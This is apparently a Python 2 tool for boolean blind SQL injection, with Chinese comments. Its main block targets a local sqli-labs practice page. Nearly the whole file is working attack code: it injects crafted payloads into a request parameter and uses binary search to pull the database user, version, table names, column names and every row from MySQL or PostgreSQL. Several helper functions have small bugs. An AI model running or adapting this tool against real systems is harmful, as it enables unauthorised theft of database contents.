#!usr/bin/python
# -*- coding:utf-8 -*-

__Author__='moxiaoxi'
__Filename__='sql.py'

import urllib, urllib2
import sys, time 
import zlib
from urlparse import urlparse, parse_qsl

class Blind():
    '盲注基础类 只适用于bool盲注'
    headers = {
       'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11',
       'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
       'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3',
       'Accept-Encoding': 'none',
       'Accept-Language': 'en-US,en;q=0.8',
       'Connection': 'keep-alive',  
    }

    def __init__(self,url,good_string, data=None, vulnerable_param=None, cookie='', timeout=0, method='GET',dbms='mysql'):
        self.url,self.params = self.parse_params(self.fix_host(url),data)
        if len(self.params) == 0:
            raise Exception('At least one parameter is required.')
        if vulnerable_param is None:
            self.vulnerable_param = self.params.keys()[-1]
        else:
            self.vulnerable_param = vulnerable_param
        self.good_string = good_string
        self.timeout = timeout
        self.headers = Blind.headers
        self.headers['Cookie'] = cookie
        self.build_request = self.build_get_request if method == 'GET' else self.build_post_request
        self.set_dbms(dbms)


    def fix_host(self,url):
        '规范url'
        if((not url.startswith("http://")) and (not url.startswith("https://"))):
            url = "http://" + hostname
        if (url.endswith("/")):
            url = host[:-1]
        return url

    def parse_params(self, url, data=None):
        '拆分url得到相关信息'
        if data is None:
            parsed = urlparse(url)
            data = parsed.query
            url = parsed.scheme + '://' + parsed.netloc +parsed.path
        data = dict(parse_qsl(data,True))
        return (url, data)

    def set_dbms(self,dbms):
        dbms_functions = {
            'mysql' : (self.to_hex, self.concat_ws),
            'pg' : (self.to_pg_string, self.concat_pg)
        }
        if not dbms in dbms_functions:
            raise Exception('Valid DBMSs are ' + " and ".join(dbms_functions.keys()))
        self.to_str,self.concat = dbms_functions[dbms]
        self.dbms =dbms

    #这里的url包括路径
    def build_post_request(self, url, params):
        return urllib2.Request(self.url,urllib.urlencode(params), self.headers)

    
    def build_get_request(self, url, params):
        return urllib2.Request(self.url + '?' + urllib.urlencode(params),None,self.headers)
    
    def make_request(self, params):
        return self.send_request(self.build_request(self.url,params))

    def send_request(self,req):
        result = urllib2.urlopen(req)
        data = result.read()
        hdrs =  result.headers
        if 'Content-Encoding' in hdrs and hdrs['Content-Encoding'] == 'gzip':
            data = zlib.decompress(result,16+zlib.MAX_WBITS)
        #test:查看具体的payload
        #print req.__dict__
        #print '=================================================================>'
        #print '[+]payload:',req._Request__original
        result = self.request_successful(data)
        time.sleep(self.timeout)
        return result
    
    def request_successful(self, data):
        return self.good_string in data

    #依据对应sql语句需修改payload
    def count_params(self, operator, number, table):
        '得到所要查的东西有多少库、表、列'
        params = dict(self.params)
        params[self.vulnerable_param] += '\' and {0} {1} (select count(*) from {2}) -- '.format(number,operator,table)
        return params

    def length_params(self, operator,number, field, table, offset):
        '获得长度'
        params = dict(self.params)
        table = ' from ' + table if table is not None else ''
        params[self.vulnerable_param] += '\' and {0} {1} (select length({2}) {3} limit 1 offset {4}) -- '.format(number, operator, field, table, offset)
        return params

    def data_params(self, number, field, str_index, table, offset):
        '获得数据'
        params = dict(self.params)
        table = ' from ' + table if table is not None else ''
        params[self.vulnerable_param] += '\' and {0} < (select ascii(substring({1}, {2}, 1)) {3} limit 1 offset {4} )-- '.format(number, field, str_index, table, offset)
        return params

    def echo_trying(self, string, number):
        sys.stdout.write('\rTrying {0} {1}'.format(string, number))
        sys.stdout.flush()


    def guess_count(self, table):
        length = 0
        last = 1
        while True:
            self.echo_trying('count', last)
            params =  self.count_params('>', last, table)
            if self.make_request(params):
                break
            last *= 2
        sys.stdout.write('\rAt most count ' + str(last))
        sys.stdout.flush()
        #接下来使用二分法
        first = last / 2
        while first < last:
            middle = (first + last ) / 2
            params = self.count_params('<',middle,table)
            if self.make_request(params):
                first = middle + 1
            else:
                last = middle 
            if middle ==  last -1:
                return middle+1
            else:
                if first == last:
                    return middle
        return pri

    def guess_len(self, field, table, index):
        length = 0 
        last = 1
        while True:
            self.echo_trying('length',last)
            #这里加个异常处理
            if last > 0xFF:
                raise Exception('Are you sure the length you want to query longer that 0xFF ? Perhaps,you should check you input! ')
            params =  self.length_params('>',last,field,table,index)
            if self.make_request(params):
                break
            last *= 2
        sys.stdout.write('\rAt most length '+ str(last))
        sys.stdout.flush()
        first =  last / 2
        while first < last:
            middle = (first + last) / 2
            params =  self.length_params('<',middle, field, table, index)
            if self.make_request(params):
                first =  middle +1
            else:
                last = middle
            if middle == last - 1:
                return middle +1
            else:
                if first == last:
                    return middle
        return pri

    def query_offset(self, field, table = None, offset=0):
        length = self.guess_len(field, table, offset)
        print '\r[+] Guessed length: ' + str(length)
        output = ''
        for i in range(1,length+1):
            first = 32#空格 第一个可打印自负
            last = 126#最后一个可打印字符
            curSize = len(output)
            while curSize == len(output):
                middle =  (first + last) / 2
                params = self.data_params(middle, field, i, table, offset)
                if self.make_request(params):
                    first = middle+1
                else:
                    last = middle

                if middle == last -1:
                    sys.stdout.write(chr(middle+1))
                    output += chr(middle+1)
                else:
                    if first == last:
                        sys.stdout.write(chr(middle))
                        output += chr(middle)
                sys.stdout.flush()
        print ''
        return output

    def count_query(self, table):
        print '[+] Guessing count...'
        print '\r[+] Guessed count:' + str(self.guess_count(table))

    def to_hex(self,s):
        return '0x' + ''.join(map(lambda i: hex(ord(i)).replace('0x',''),s))

    def concat_ws(self,fields):
        return 'concat_ws(0x3a,{0})'.format(fields)

    def concat_pg(self,fields):
        output = ''
        for i in fields.split(','):
            if len(output) >0:
                output += '||CHR(58)||' + i
            else:
                output += i 
        return output + ''

    def to_pg_string(self, s):
        return '||'.join(map(lambda x: 'CHR(' + str(ord(x)) + ')',s))

    def parse_where(self,where):
        where_cond = []
        for i in where.split(' '):
            if(len(i) > 0 and i[0] == "'"):
                where_cond.append(self.to_str(i[1:-1]))
            else:
                where_cond.append(i)
        return ' '.join(where_cond)

    #fields 表示要注入得到的数据
    def query(self, fields, table=None, where='', start=0):
        #如果不加table，即select user() 这种情况
        if table == None:
            if ',' in fields:
                fields = self.concat(fields)
            return self.query_offset(fields)
        try:
            print '[+] Guessing number of rows...'
            if len(where) > 0:
                where = self.parse_where(where)
                table = table + ' where ' + where
            if ',' in fields:
                fields = self.concat(fields)
                print fields
            count = self.guess_count(table)
            #print 'test:',table
            print '\r[+] Rows: ' + str(count) + '         '
            results = []
            for i in range(start, count):
                print '[i] Dumping record ' + str(i+1) + '/' + str(count)
                results.append(self.query_offset(fields, table, i))
            print '[+] Query results :'
            for i in results:
                print ' -> ' + i
            return results
        except KeyboardInterrupt:
            print 'stopped!'

    def proof_of_concept(self):
        if self.dbms == 'mysql':
            username = 'user()'
            database = 'database()'
            version = 'version()'
        elif self.dbms == 'pg':
            username = 'getpgusername()'
            database = 'current_database()'
            version = 'version()'
        else:
            raise Exception("DBMS not supportd yet")
        print '[+] Retrieving username'
        username =  self.query_offset(username)
        print '[+] Retrieving database'
        database = self.query_offset(database)
        print '[+] Retrieving version '
        version = self.query_offset(version)
        print '[+] Username: ' + username
        print '[+] Database: ' + database
        print '[+] Version: ' + version
        return (username,database,version)

if __name__ == "__main__":
    test = Blind('http://localhost:8888/sqli-labs/less-8/?id=1','You are in...........')
    username,database,version=test.proof_of_concept()
    print 'Get table'
    table_where = 'table_schema = \''+database+'\''#系统会自动转换,不过需要空格分开，才能触发
    tables = test.query('table_name','information_schema.tables',table_where)
    for i in tables:
        column_where = table_where+' and table_name= \''+i+'\''
        columns =  test.query('column_name','information_schema.columns',column_where)
        print 'database -> ',database,'\ntable -> ',i,'\ncolumns: -> ',columns
        for j in columns:
            data = test.query(j,i)
            print 'database -> ',database,'\ntable -> ',i,'\ncolumns: -> ',j,'\n data -> ',data
